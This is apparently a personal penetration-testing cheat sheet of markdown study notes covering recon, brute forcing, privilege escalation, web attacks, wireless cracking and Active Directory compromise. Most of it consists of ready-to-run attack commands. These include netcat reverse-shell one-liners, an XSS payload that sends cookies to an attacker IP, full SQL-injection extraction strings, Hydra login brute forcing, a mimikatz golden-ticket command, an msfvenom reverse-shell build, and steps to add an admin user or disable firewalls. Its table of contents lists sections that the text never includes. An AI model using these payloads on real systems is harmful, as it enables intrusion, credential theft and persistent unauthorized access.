- [Net Sec](#net-sec)
  - [passive](#passive)
    - [recon-ng](#recon-ng)
    - [Weaponization](#weaponization)
  - [active](#active)
  - [Passwords](#passwords)
    - [create list](#create-list)
    - [hashcat](#hashcat)
    - [John](#john)
    - [Hydra](#hydra)
  - [Phishing](#phishing)
  - [Shell](#shell)
    - [Priv Escalation](#priv-escalation)
      - [shared libraries](#shared-libraries)
      - [capabilities](#capabilities)
      - [Cronjobs](#cronjobs)
      - [PATH](#path)
      - [NFS](#nfs)
- [Getting file into target](#getting-file-into-target)
- [Working with executables](#working-with-executables)
  - [finding them](#finding-them)
  - [browsing important files](#browsing-important-files)
- [Metasploit with database](#metasploit-with-database)
  - [Meterpreter (payload)](#meterpreter-payload)
  - [Recoinaissance](#recoinaissance)
- [BASIC ENUM](#basic-enum)
  - [LINUX](#linux)
    - [Existing Tools](#existing-tools)
  - [Windows](#windows)
    - [DNS, SMB, SNMP](#dns-smb-snmp)
    - [External Tools](#external-tools)
- [Web hacking](#web-hacking)
  - [Subdomain](#subdomain)
  - [Wildcards](#wildcards)
  - [User enumeration](#user-enumeration)
  - [IDOR](#idor)
  - [File inclusion](#file-inclusion)
  - [SSRF](#ssrf)
  - [XSS](#xss)
  - [Command injection](#command-injection)
  - [Authentication](#authentication)
  - [database](#database)
    - [Steps](#steps)
    - [UNION](#union)
      - [Find data oracle](#find-data-oracle)
    - [blind](#blind)
      - [binary](#binary)
        - [sqlmap](#sqlmap)
        - [Provoking errors](#provoking-errors)
      - [Time](#time)
- [burpsuite](#burpsuite)
  - [Repeater](#repeater)
  - [Intruder](#intruder)
    - [Macros](#macros)
  - [Decoder, Comparer, Sequencer](#decoder-comparer-sequencer)
- [Usefull Windows commands](#usefull-windows-commands)
  - [Stabilize and Post Exploit windows](#stabilize-and-post-exploit-windows)
- [wireless](#wireless)
  - [aircrack-ng tools](#aircrack-ng-tools)
  - [steps](#steps-1)
    - [getting packages](#getting-packages)
    - [weak IV traffic](#weak-iv-traffic)
    - [evil twin](#evil-twin)
- [Attack strategies](#attack-strategies)
  - [Active Directory](#active-directory)
    - [Commands](#commands)
  - [KERBEROS](#kerberos)
    - [POWERVIEW](#powerview)
    - [bloodhound](#bloodhound)
    - [mimikatz](#mimikatz)
    - [maintaining access](#maintaining-access)
    - [Lay of the Land](#lay-of-the-land)
- [Network assessment](#network-assessment)
  - [Steps](#steps-2)
  - [PIVOTING](#pivoting)
    - [SSH](#ssh)
    - [PLINK.EXE](#plinkexe)
    - [SOCAT](#socat)
    - [CHISEL](#chisel)
    - [SSHUTTLE](#sshuttle)
    - [PROXY](#proxy)
  - [GIt enumeration](#git-enumeration)
- [Antivirus Evasion](#antivirus-evasion)
  - [Cross compilation](#cross-compilation)
  - [How AV Works](#how-av-works)
- [Empire (windows) / Starkiller](#empire-windows--starkiller)
  - [Hop Listener](#hop-listener)


# Net Sec

## passive
- whois
- nslookup -type=?? URL SERVER
- dig SERVER URL TYPE
- host
- Google Hacking Database
  - [intitle:"index of" "nginx.log"](https://www.exploit-db.com/google-hacking-database)
  - 
- Google
  - blabla site:
  - filetype:pdf  inurl:www.google.de
  - site:hs-worms.de filetype:docx
  - *intitle:index.of site:*
  - *intitle:login*
  - https://web.dev/measure/
  - robots.txt

- Maltego
  - graphical

- DNS:
  - shodan.io [check black friday - https://www.shodan.io/]
  - https://viewdns.info/
  - https://threatintelligenceplatform.com/

### recon-ng
- Workspace:
  - workspace create NAME
  - db schmea = check database
- marketplace search MODULE
  - info, install, remove MODULE
- Modules
  - module search/load  
  - options list/set/unset

### Weaponization
- Developing malicious code
- https://github.com/infosecn1nja/Red-Teaming-Toolkit#Payload%20Development
- VBE
- HTA - Html application
- windows reverse shell
  - get-executionpolicy = for ps1 files
  - set-executionpolicy -Scote Currentuser remotesigned
  - powershell -ex bypass -File name.ps1
  - 

## active
- interacting
- nmap
- https://www.rapid7.com/db/
- searchsploit
  
## Passwords
- cracking: from hash
- guessing: from dictionary (loud)
- dump = leaks of passwords/hash
- Combine
  - cat file1 file2 > file3
  - sort fil3 | uniq u > cleaned

### create list
- cewl URL
  - -w = output
  - -d 5 = depth
  - -m 5 = minimum
  
- username_gennerator.py

- crunch
  - combination of characters
  - crunch 2 2 123456abcd -o output
  - -t startpassword[symbol1][symbol2]
    - @ lower case
    - , upercase
    - % numeric
    - ^ special

- cupp
  - based on information of the target, birthdate, pet, etc
  - https://github.com/Mebus/cupp.git

### hashcat
- Identify hash
  - hashid
  - hashidentifier

- hashcat
  - a 0 = dictionary attack
    - dictionary = list | brute-force = guessing
  - -m 0 = type of hash
  - -a 3 = brute force method
  - ?d = use digit for generating
  - TOTAL_CHARACTERS = generate list

### John
- Using rules
  - john --wordlist=existing_list --rules=pick_one --stdout
  - adding rule
    - conf file: [rule_name] Az"[0-9]" ^[!@#$]
 
### Hydra
- hydra -l username -P wordlist.txt server service
- hydra -l username -P wordlist.txt service://server
- -d = debug
- -v = verbose
- -V = show attempts
- -f = terminate if found
- -t = number threads

- web
  - hydra -l USERNAME -P wordlist.xt server *request* **"/[inside_request]:username=^USER^&password=^PASS^:F=incorrect"** -v
  - hydra -l USERNAME -P wordlist.xt server *request* **"/[request]:[body_request]"** -vV -f
  - hydra -l USERNAME -P wordlist.xt server *request* **"/[request]:username=^USER^&password=^PASS^:F=incorrect"** -v
    - Request: HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy
    - IP/URL http-get-form | http-post-form "/login-get/index.php:username=^USER^&PASSWORD=^PASS:S=logout.php" -f
      - S= [message_for_success]
      - F= [message_for_failed]
      - -f = stop attack after finding

- FTP
  - hydra -l [USERNAME] -P password.lst ftp://IP
    - -L = list of usernames

- SMPT
  - -l email@address.com -P [Password_List] smtp://IP -v

- SSH
  - -L [USER_LIST] -P [PASS_LIST] ssh://IP -v

## Phishing
- Steps
  - register domain name
  - ssl/tsl certificated
  - email server/account
  - Dns records
  - web server

- GoPhish
  - manage phishing campaings

- Droppers
  - poison, downloaded file

## Shell
- Reverse:
  - target: 
    - nc <LOCAL-IP> <PORT> -e /bin/bash
    - mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LOCAL-IP> <PORT> >/tmp/f”
  - Ziel: nc -nlvp PORT

### Priv Escalation
- https://tryhackme.com/room/introtoshells
- https://tryhackme.com/room/linprivesc
- Check list
  - hostname
  - uname -a = sys info, kernel, 
  - /proc/version = process, compiler,
  - /etc/issue = OS info
  - ps a[all]u[who_launched]x[not_terminal]  (all users)| -a | axjf (tree)= process list
  - env = environmental variables
  - cat /etc/passwd | cut -d ":" -f 1 // grep home
  - ifconfig
  - netstat -a | -at [tcp] -au [upd] | -l [listening] | -s [statistic] | -tp [pid] | -i [interface_data]
  - find 2>/dev/null = redirect errors
    - -name, -perm a=x, -mtime
    - find / = directory config
    - -perm -u=s = SUID
    - -name perl*, python*, gcc* = dev tools
    - find / -type f -perm -04000 -ls 2>/dev/null ==> *SUID or SGID* files
    - find / -perm -u=s -type f 2>/dev/null
    - find / -writable 2>/dev/null ==> find writable folders

#### shared libraries 
- sudo -l ==> LD_PRELOAD ==>   
- https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/
- ldd = shared object dependencies

#### capabilities
- getcap -r / 2>/dev/null

#### Cronjobs
- privilege of the owner
- find script with root privilege
- /etc/crontab
- check if file has no fullpath + create own script with reverse shell

#### PATH
- echo $PATH
- export PATH=/path/to/folder:$PATH
- PATH=$PATH:/path/to/folder
- find / -writable 2>/dev/null ==> find writable folders
  - find / -writable 2>/dev/null | grep usr | cut -d "/" -f 2,3 | sort -u
  - find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u ==> exclude running process

#### NFS
- find root key + connect
- /etc/exports ==> find no_root_squash = create x with SUID
- showmount -e target-IP
- mount no_root_squash from /etc/exports

# Getting file into target
- Option 1 - starting local server
  1. python3 -m http.server 8000
  2. wget attacker-machine:8000:file.ext
  3. make executable: chmod +x file.ext
- Option 2 - copy source
  1. Copy code from source and past in the target + save .sh
  2. make executable: chmod +x file.ext
- option 3 - smbserver
  -  create server: sudo /opt/impacket/examples/smbserver.py share . -smb2support -username user -password s3cureP@ssword
  -  create client: net use \\ATTACKER_IP\share /USER:user s3cureP@ssword
  -  upload file: copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe

# Working with executables

## finding them
- Option 1
  - find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

- Option 2
  - strings /usr/local/bin/suid-env2
  - /bin/bash --version < 4.2
  - function /usr/sbin/service { /bin/bash -p; }
  - export -f /usr/sbin/service
  - /usr/local/bin/suid-env2

## browsing important files  
- History
  - cat ~/.*history | less
  - .ssh Folder is always a must

# Metasploit with database

1. service postgresql start
2. service metasploit start
3. update-rc.d postgresql enable *for performance*
4. update-rc.d metasploit enable *for performance*
5. db_rebuild_cache [in msf console] *for performance*

- db_command ==> db_status, db_nmap etc

- workspace -a (add)
- workspace -d (delete)
- workspace name (move to name)

## Meterpreter (payload)
- hashdump (migrate to process first)
- getpid
- getpriv
- migrate PID [try and error, migrating to existing process] + check hashdump
- search

## Recoinaissance

- db_nmap 
  - --scrip *script_name*: most commom vulnerability scrips, CVEs will be shown
    - https://www.exploit-db.com/
    - https://nvd.nist.gov/vuln/full-listing
  - -sC: other common scripts
  - -sS (Syn), -sA(Ack)
  - -A: basic scan with OS include
    - -sV -O -sC [default scripts] --traceroute
  - -p-: all ports
  - -sV: version of services found
  - -Pn: no ping
  - -T[0-5] = Control speed
  - -S [Spoofed] -e [INTERFACE] -Pn [NO Ping] => we need to monitor the traffic
  - --spoof-mac [MAC]
  - -f[-f] => fragment
  - --reason / -v / -vv / -d / -dd

- Output
  - -oN = normal output
  - -oG = grep output

- hosts: list hosts from db
  - -a: add
  - -d: delete
  - -R: inside a exploit/scanner to add the scanned host as RHOST

- services: display services found in scans
 - From services google for vulnerabilities /also search in metasploit
 - Common services: http, ftp, smb, ssh, rdp

# BASIC ENUM

- User/groups
- hostnames
- routing tables
- network shared/services
- application / banner
- firewall
- service
- snmp, dns
- credentials

## LINUX

### Existing Tools
- ls /etc/*release = version, os
- hostname
  
- var/mail
- /usrbin/ /sbin/ = installed apps
- rpm -qa = query packages
- dpkg -l = debian
- who
- w = more powerfull
- id
- last = who used
- sudo -l = commands for invoking user
  
- netstat
  - -a = all listening/non-listening
  - -l = listening
  - -n = numero, 
  - -t = tcp
  - -u = udp
  - -x = unix
  - -p = process id
  - find open ports
- arp -a = find neighbors
- lsof = List Open Files
  - -i = internet

- ps
  - -e = all
  - -f = more info
  - -l = long format
  - -ax/aux = comparable
  - -j = job format

## Windows
- systeminfo
- wmic
  - wmic qfe get Caption, Description = updates
  - wmic product get name,version,vendor
- Get-CimInstance
- Get-Servive WinDefend
- Get-MpComputerStatus
- get-Netfirewallprofile
- Test-NetConnection 
- net start = started services
- whoami 
  - /priv
  - /groups
- net 
  - user
  - group
  - localgroup [administrators]
  - accounts /domain
  - share

- ipconfig
  - /all

- netstat
  - -a all
  - -b binary connection
  - -n not resolving ip
  - -o PID
  - 

### DNS, SMB, SNMP
- dig
  - -t AXFR DOMAIN_NAME @DNS_Server = zone transfer
- SMB
  - Server Message Bloc
  - net share

- SNMP
  - Simple Network Management Protocol
  - snmpcheck
  - /opt/snmpcheck/snmpcheck.rb 10.10.84.238 -c COMMUNITY_STRING.



### External Tools

- enum4linux IP_
- metasploit (smb/enum || ssh/enum)
- gobuster / ffuf
- lienum (linux): 
  - the file must be executed in the target
  - search for readble important files
- executables (SUID): find / -perm -u=s -type f 2>/dev/null 
- How to abuse of each executable: https://gtfobins.github.io/gtfobins/vim/

- PowerSploit (windows)
  - in the target 

# Web hacking
## Subdomain
- search certificates: 
  - https://transparencyreport.google.com/https/overview
  - https://crt.sh/
    - $ curl -s "https://crt.sh/?q=%.<domain>&output=json" | jq '.[].name_value' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u > hosts-crtsh.txt
    - curl -s https://certspotter.com/api/v0/certs\?domain\=$1 | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | sort -u > hosts-certspotter.txt
- Google search engine: site:*.domain.com
- dnsrecon
- dnsdumpster => online


## Wildcards 
- A lot of false positive
- need to be filtered
- dig domain.de A,CNAME {test321123,testingforwildcard,plsdontgimmearesult}.<domain> +short | wc -l ===> > 1, a lot of false positive from brute force


- OWAPS *Amass*: amass -src -ip -active -brute -d
  - https://github.com/OWASP/Amass/blob/master/doc/tutorial.md
  - amass -passive -d domain.de -src
  - $ amass enum -active -d owasp.org -brute -w /root/dns_lists/deepmagic.com-top50kprefixes.txt -src -ip -dir amass4owasp -config /root/amass/config.ini -o amass_results_owasp.txt
  - https://medium.com/@noobhax/my-recon-process-dns-enumeration-d0e288f81a8a

- Create wordlist (from commands above)
  - sed 's/$/.<domain>/' subdomains-top1mil-20000.txt > hosts-wordlist.txt
  
## User enumeration
-  fuff -w [wordlist] -X [Method] -d " username=FUZZ& data to be sent" -H "additional header request" -u "url" -mr "we are looking for this answer / match regex"
   -  the *FUZZ* will be replaced by the items in the wordlist

- ffuf -w [Wordlist1]:KeyWord1 , [Wordlist2]:KeyWord2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-w  ww-form-urlencoded" -u http://10.10.1.70/customers/login -fc 200j@fakemail.thm"
- https://tryhackme.com/room/authenticationbypass

## IDOR
Insecure Direct Object Request

## File inclusion
- insecure input validation
- path traversal: ../../../etc/passwd
- Important files
  - /etc/issue - system identification
  - /etc/profile - default variables terminal
  - /proc/version - kernen versel
  - /etc/shadow - users password
  - /root/.bash_history
  - /var/log/dmessage
  - /root/.ssh/id_rsa = private rsa key
  - /var/log/apache2/access.log
  - C:\boot.ini (windows)

- null byte = %00, injection (terminate string)
- curl -X METHOD -d [data]
- magic numbers
- double extension
- exiftools -Comment=PAYLOAD picture.jgp.php ==> Comments!!!

## SSRF
- Server-Side Request Forgery
- Where? 
  - Full Paramter in the address bar ("value="http..../name")
  - partial URL
  - Blind: requestbin.com
  - ../ => directory trasversal
  - &x= ==> ignore everything that comes after that

## XSS
- Cross-Site Scripting
- test: parameters, URL File Path, HTTP Headers
- in js onload event within a tag
- Polyglot: jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
- Payload for shell: </textarea><script>fetch('http://{URL_OR_IP}?cookie=' + btoa(document.cookie) );</script>
-                    </textarea><script>fetch('http://10.8.80.130:1234?cookie=' + btoa(document.cookie) );</script> 

## Command injection
- blind: no output, test with ping/sleep/timeout(win) || force output > etwas
  - curl http://website/command
- verbose: output/feedback
- $payload = "\x2f\x65\x74\x2f\x70\x61\x73\x73\x77\x64"

## Authentication
- Brute force: 
  - in Header ==> **X-Forwarded-For**: [IP] ==> avoid IP blocking
  - intercalate correct login AND brute force (intruder)

- Blocked account
  - enumerate username until valid one ==> NULL payload for password + several tries until get different response
  - try password with these usernames ==> grep warning for incorrect passwords

## database
### Steps
- find vulnerability: ', "
- find total columns: UNION SELECT NULL,NULL,NULL
- find name of db: UNION SELECT NULL,NULL,database()
- find tables: UNION SELECT NULL,NULL,table_name from **information_schema.tables** WHERE table_schema = 'DB name'
- find columns in table: UNION SELECT NULL,NULL,column_name FROM **information_schema.columns** WHERE table_name= 'Table name'
- find data: UNION SELECT NULL,NULL,group_concat(column,column,column) from table_nae

- Column_name known
  - aa' field=(COMMAND),field='

- Bypass login: 
  - admin'-- [everything here is a comment and will be ignored]
  - or 1 = 1'-- ==> will always return true
  - header:  X-Forwarded-For: IP

### UNION
- join two or more tables + number o columns and data type muss be equal
- 'UNION SELECT NULL,NULL...-- - ==> until success to find number of columns
  - NULL = compatible with all data type
- 'UNION SELECT column1,column2 FROM table_name-- -
- find db = '0 union 1,2,database()-- -
- find tables = '0 union select  1,2,group_concat(table_name) FROM information_schema.tables where table_schema='db_name'
  -  information_schema = info about all databases and tables
- find columns: 0 union select  1,2,group_concat(column_name) FROM information_schema.columns where table_name= 'table_name'-- -
- content: '0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users

- SQLITE 
  - exist vuln: ' UNION SELECT 1,2'
  - find tables: ' UNION SELECT 1,group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT LIKE 'sqlite_%''
  - find columns: ' UNION SELECT 1,group_concat(column_name) FROM table_name '
  - find content: ' UNION SELECT 1,group_concat(column1 || '-' || column2) FROM table_name '
  
- Find version (always UNION)
  - Microsoft, MySQL	SELECT @@version
  - Oracle	SELECT * FROM v$version
  - PostgreSQL	SELECT version()


#### Find data oracle
Oracle DB: '+UNION+SELECT+NULL,NULL+FROM+v$version--
2 Columns strings: '+UNION+SELECT+'abc','abc'+FROM+v$version--
Show tables: '+UNION+SELECT+table_name,+NULL+FROM+all_tables-- 
Show columns: '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='table_name'
Find content: '+UNION+SELECT+colum1,+column2,+FROM+discovered_table-- 

### blind
- Change SQL Command in the trackinID + test
- Table exists: ' AND (SELECT 'a' FROM users LIMIT 1)='a;
- Size of string: ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>§1§)='a;==> payload type number to find 1 until n
  - admin' AND length((SELECT password from users where username='admin'))==37-- -
  
- Getting data string per string:
  - SELECT column FROM table_name LIMIT 0,1-- - //
    - LIMIT start,from_total ==> LIMIT 0,1 = first, from total 1 || LIMIT 0,2 start 0 from total 2
  - SUBSTRING((SELECT column FROM table_name LIMIT 0,1)0,1)

#### binary
- like a% = starting with a
- Find DB name: ' UNION SELECT, NULL,NULL,NULL where database() like '%a' 
- Find table name: ' UNION SELECT NULL,NULL,NULL FROM **information_schema.tables** WHERE **table_schema**='name_db' AND **table_name** like '[]%';--
- find columns 1: ' UNION SELECT NULL,NULL,NULL FROM **information_schema.colums** WHERE **table_name**='name table' AND **column_name** like '[]%';--
- find columns 2: ' UNION SELECT NULL,NULL,[sleep(4)]|NULL FROM **information_schema.colums** WHERE **table_name**='name table' AND **column_name** like '[]%' AND column_name!='found 1';--
- find content: ' UNION SELECT NULL,NULL,NULL FROM **table_name** where **column_1** like 'a%';--

- individual charachter + size
  - ' AND (SELECT 'a' FROM [table]  WHERE [column]='value' AND LENGTH(value)>§1§)='a;==> payload type number to find 1 until n
  -(SQLITE): [known_value]' AND length((SELECT [column] FROM [table] WHERE [column]='value'))==37-- -
 - find substring SQLITE: admin' AND SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)-- -
 
 ##### sqlmap
- sqlmap
  - -u = url
  - --data="id=123&password=123"
  - --level= ??
  - --risk= ??
  - --dbms=type of db
  - --technique=???
  - --dumb

##### Provoking errors
- Oracle
  - xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
    - case = false  ==> no error produced
    - TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' = FALSE ==> execute after ELSE query
      - Condition = TRUE ==> forced error 1/0
      - Condition = FALSE ==> goes to 2nd question and asks if the info about the db is correct

  - xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
    - case = true ==> error will be produced
    - TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' = TRUE ==> produce error that is processed by the query

#### Time
- with sleep() ==> success if the function is executed
- admin123' UNION SELECT SLEEP(5),1,x,y,z;--
- similar to blind
- admin123' UNION SELECT 1,SLEEP(5) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'password%' and COLUMN_NAME!='username';--
  
- Microsoft: 
 - '; IF (1=2) WAITFOR DELAY '0:0:10'-- = false, will springt action
 - '; IF (1=1) WAITFOR DELAY '0:0:10'-- = true, action

- PostgreSQL:
  - ' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)--


- in the intruder: substring method with password list
' AND (SELECT SUBSTRING(password,X,1) FROM users WHERE username = 'administrator')='§a§;
 - SUBSTRING(string, start, length)
 - Cluster Bomb: several $payload$, one for the position_number, one for the string
 - Brute_force: iterate over given list

- Known table, columns:
  - admin123' UNION SELECT 1,2,[sleep(5)] from *table_name* where *column* like '[character]%';--
  - admin123' UNION SELECT 1,2,[sleep(5)] from *table_name* where username='[name]' and password like 'a%';--


admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
admin123' UNION SELECT SLEEP(5),2;--

# burpsuite

## Repeater
- manipulate the request
- check response
- 
## Intruder
- brute force and fuzzing
- Positions: where to insert payload
- Attack types 
  - **sniper**: one set of payload (wordlist) / i.g. username/password
  - **battering ram**: same payload in every position
  - **pitchfork**: several sniper at the same time, one payload per position. For credentials
  - **Clusterbomb**: multiple payload, individual iteration, every combination

- Payload: define list file, regex or other condition
- Filtering results: 
  - status (200, 401, 302)
  - size: sucess 400 bytes, failed 600 bytes

- CSRF Token: 
  - token changed by every update of the page
  - define macros
  
### Macros
- Repeated actions
- project options + add + selection action to be done
- Session handling rule: select macro + select where to do it (intruder, repeater, target) + update only "name of the field", 

## Decoder, Comparer, Sequencer
- Decoder
  - Encode e decode data
  - hashsums, ASCII, binary, hexa, etc

- Comparer
  - compare data
  - compare responses after logins attempt

- Sequencer
  - measure entropy of tokens
  - analyze after an amount of tokens
  - Auto Analyze = capture every 2000 requests
  

# Usefull Windows commands
- Find file: **wmic** find users || dir /p datei.txt (find file)
- Find AV: wmic /namespace:\\root\securitycenter2 path antivirusproduct (workstation)
  -  Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct (workstantion)
  -  Get-Servive WinDefend
  -  Get-MpComputerStatus

- Firewalls
  - get-Netfirewallprofile | Format-table
  - set-netFirewallprofile -Profile NAME,nAME,NAMe, -enables Flase
  - | select Displayname, Enables, Description
  - get-netfirewallrulle | select Fields
  - get-MpThreat: findings by Denfender

- Test Connection
  - Test-NetConnection / TCPClient
  - Test-NetConnection -ComputerName IP -Port

- get-EventLog -List
- sysmon: logger
  - get-Process | Where-Object  { $_.ProcessName -eq "Sysmon" }
  - Get-CimInstance win32_service -Filter "Description = 'System Monitor Service'"
  - Get-Service | where-object {$_.DisplayName -like "*sysm*"}
  - Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"
  - reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational
  - findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*

- Services
  - wmic product get name,version
    - wmic service where "name like 'name'" get Name,Version,Pathname
  - get-ChildItem -Hidden -Path C:\Users\NANE
  - get-Process
    - -Name
  - netstat -noa
  - net start
  - nslookup

- findstr
- Windows: get file 
- powershell -c Invoke-Webrequest -OutFile winPeas.exe http://10.8.80.130/file.ext
- powershell -c wget "http://10.8.80.130/Invoke-winPEAS.ps1" -outfile "winPEAS.ps1"
- whoami /priv = privileges in windows
- whoami / groups
- wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
  - find services not in folder c:\windows
  - find services without quotation marks
  - account for the service: sc qc SERVICE_NAME ==>local syste?


- check permision
  - powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list" ==> if fullcontroll = vuln

- powershell.exe
  
## Stabilize and Post Exploit windows
- Create user + add group admin
  - net user USERNAME PASS /add
  - net localgroup Administrators Username /add


# wireless
- SSID: network name
- BSSID: access point, MACO address
- WPA2
  - PSK = pre shared key = one password for everyone
  - EAP = radius = username + password

## aircrack-ng tools
- airmon-ng = monitor interface
  - airmon-ng start wlan0 = start monitoring
    - stop connections
- airmon-ng check = processes that may interfere with aircrack-ng
  - airmon-ng check kill = kill all processes (no internet)
  - Restore: 
    - airmon-ng stop connection (mode)
    - sudo service NetworkManager restart || sudo service network-manager restart || sudo service wpa_supplicant restart || sudo service dhclient restart
## steps
1 - kill process that can conflict = airmon-ng check kill
2 - turn network card to monitor mode = airmon-ng start [network_name]
3 - find AP around and capture traffic (also 4 handshake) = airodump [my_listener] --bsid [my_mac] --channel --write output
4 - deauthenticate an user to force 4 handshae =  aireplay-ng --deauth 0 -a [my_mac] -c [victim] [network_name]
5 - crack PSK - brute force = aircrak-ng -w [wordlist] -b [my_mac] [file.cap]

### getting packages
- airomon-ng start wlan0 = promiscuous mode interface to sniff wireles package (same channel)
- airodump-ng network (wlan0monl) = sniff packages
- airodump-ng wlan0mon --bssid [123] --channel [123] --write OUTPUT
- 
### weak IV traffic
- 
- fake authentication
  - aireplay-ng --fakeauth 0 -a MAC wlan0mon -h MAC-host
  - aireplay-ng --deauth 0 -e "name" wlan0mon
  - 
### evil twin
- create fale access point (ap)
- deauthenticate client
- force clien to connect to fake ap

# Attack strategies

## Active Directory
- Definitions
  - Domain Controler: provide AD services + control all
  - Org Units: containers inside AD
  - Active Directory Objects: user, group, component, printer
  - AD Domains: collection of components within AD
  - Forestr: domains trust each other

- Accounts
  - Builin/Administrator = local admin
  - Domain Admin: all resources
  - Entrepreise admin: forest root
  - schema admin: modify domain/forest
  - server operator: manage domain server
  - account operator: manage users

### Commands
- systeminfo ==> command
  - Os config + Domain
  - Domain = AD
  - Workgroup = local workgroup
- getAdUser -Filter*
  - show all ad user account
  - -Searchbase "CN=Users,DC=THMREDTEAM,DC=COM"
    - Get-ADUser -Filter * -SearchBase "OU=THM,DC=THMREDTEAM,DC=COM"

- port 139/445
- Enum4linux = Enumerate
- kerbrute = brute force in kerberus active directory
  - Find users
    - kerbrute userenum -d domain --dc ip word_list.txt
- Find user without password (NP)
  - GetNPUsers.py --no-pass -usersfiles {wordlist.txt} domain.com/ -dc-ip [IP-address]
- find other hashes
  - secretsdump.py -dc-ip ip host.local/user@ip
- Pass the hash
  - evil-winrm -i IP -u USERNAME -H hash

## KERBEROS
- authentication service
- ticket system
- Enumerate users
  - kerbrute userenum -d domain --dc domain string wordlist.txt
- Rubel.exe (in the victim's machine) to find hashes
- mimikatz for golden ticket
  - lsadump::lsa /inject /name:USERNAME
  - kerberos::golden /user:[logged_user] /domain:[name_domain] /sid: /krbtgt:[hash_des_Nutzers] /id:
  - msic::cmd ==> access other machine



### POWERVIEW
- enumrate domains on windows
  - powershell -ep bypass ==> allow run script
  - . .\PowerView.ps1
- Get-ChildItem function: ==> commands
 - Introduction: https://medium.com/@browninfosecguy/an-introduction-to-powerview-bdfd953f2c4c
   - $scriptFunctions = Get-ChildItem function: | Where-Object { $currentFunctions -notcontains $_ }
   - $scriptFunctions | Format-Wide -Column 4
   - Get-NetDomainController
   - Get-DomainPoliciy
   - get-netuser | select-object displayname,samaccountname  
   - Get-UserProperties -Properties 
   - get-netcomputer
   - [help] get-command
   - get-help Get-NetComputer -examples
   - Get-NetGroupMember
   - Get-NetGPO  / Invoke-ShareFinder = shares

### bloodhound
- graphical interface
- In the target:
  - Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
- in the attacker
  - neo4j console => database
  - bloodhound
    - import looted files

### mimikatz
- dumping credentials   
- mimikatz.exe
  - privilege::debug ==> Check if we are admin
    -lsadump::lsa /patch 

### maintaining access
- create reverse shell
  - msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe
  - use exploit/multi/handler
  - use exploit/windows/local/persistence

### Lay of the Land
- Identify segemtns: vlans, dmz, 
- netstat
  - -a = all listening/non-listening
  - -l = listening
  - -n = numero, 
  - -t = tcp
  - -u = udp
  - -x = unix
  - -p = process id
  - find open ports
- arp -a = find neighbors
- systeminof
  - part of Active Directory (workgroup / domain)
  
- Find AV
  - wmic
  - Get-CimInstance
  - Get-Servive WinDefend
  - Get-MpComputerStatus
  - get-Netfirewallprofile
  - Test-NetConnection 

- Logs
  - sysmon: logger
    - get-Process | Where-Object  { $_.ProcessName -eq "Sysmon" }
    - Get-CimInstance win32_service -Filter "Description = 'System Monitor Service'"
    - Get-Service | where-object {$_.DisplayName -like "*sysm*"}
    - Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"
    - reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational
    - findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*

- IDS, IPDS, Endpoint Detection and Response

- Enumerate services, hidden folders and process, shared files/printers
- wmic product get name,version
  - wmic service where "name like 'name'" get Name,Version,Pathname
- get-ChildItem -Hidden -Path C:\Users\NANE
- get-Process -Name
- netstat -noa
- net start


# Network assessment
- Requirements: 
  - Number of machines
  - services running
  - Publici interface?
  - git server ?
  - public IP

-  No dns if web: add to etc/hosts
-  OS: mostly on the server than guessing from nmap
-  get shell if possible + stabilize the shell
   -  python3 -c 'import pty;pty.spawn("/bin/bash")' = better view
   -  export TERM=xterm = commands like clear
   -  ctr + z = back to our shel
   -  stty raw -echo; fg = back to reverse shell
   -  l
-  get ssh keys

-  using pre installed tools
   -  arp -a => arp neighbour cache
   -  netstat -an => open ports / connections
      -  -a = all
      -  -n = address and port
      -  -o = process id
   -  /etc/hosts
